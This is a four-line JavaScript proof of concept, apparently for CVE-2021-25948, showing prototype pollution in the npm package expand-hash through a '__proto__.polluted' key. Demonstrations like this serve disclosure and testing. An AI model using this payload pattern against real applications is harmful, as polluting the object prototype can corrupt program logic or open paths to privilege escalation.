//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25948
  var expandHash = require("expand-hash");
  var obj = {};

  expandHash({ "__proto__.polluted": "yes" });
